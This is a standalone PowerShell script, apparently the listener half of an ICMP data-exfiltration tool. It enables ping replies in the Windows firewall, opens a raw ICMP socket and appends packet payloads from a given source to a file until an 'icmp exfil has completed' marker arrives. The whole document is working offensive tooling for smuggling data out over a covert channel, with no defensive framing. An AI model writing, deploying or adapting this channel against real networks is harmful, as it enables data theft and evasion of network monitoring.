param (
    [string]$src,
    [string]$file
)

function Enable-PingReply {
    Write-Host "[+] Enabling ICMP Ping Replies..."
    try {
        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True -PassThru
    } catch {
        Write-Host "[!] Error enabling ping replies. Run as administrator."
        exit
    }
}

function Receive-ICMPFile {
    Enable-PingReply
    if (Test-Path $file) {
        $overwrite = Read-Host "The file already exists. Overwrite? (Y/n)"
        if ($overwrite -ne 'Y') { exit }
        Remove-Item $file
    }

    $icmpClient = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
    Write-Host "[+] Listening for ICMP data from $src..."
    
    $first = $true
    $lastData = ""

    while ($true) {
        $buffer = New-Object byte[] 4096
        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 0)
        $received = $icmpClient.Receive($buffer)
        $data = [System.Text.Encoding]::ASCII.GetString($buffer, 28, $received - 28)

        if ($data -eq "icmp exfil has completed") {
            Write-Host "[+] File transfer completed!"
            exit
        }

        if ($data -ne $lastData -and $first) {
            Write-Host "[+] Receiving file data..."
            $first = $false
        }

        if ($data -ne $lastData) {
            [System.IO.File]::AppendAllText($file, $data)
        }

        $lastData = $data
    }
}

Receive-ICMPFile
